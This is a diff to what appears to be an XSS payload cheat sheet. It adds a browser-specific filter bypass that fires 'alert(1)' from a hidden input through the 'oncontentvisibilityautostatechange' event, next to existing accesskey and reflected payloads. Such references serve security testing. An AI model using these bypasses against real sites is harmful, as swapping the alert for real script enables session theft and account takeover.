@@ -295,6 +295,10 @@ e.g: 14.rs/#alert(document.domain)
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
+in newer browsers : firefox-130/chrome-108
+```javascript
+<input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
+```
 
 ### XSS when payload is reflected capitalized
 
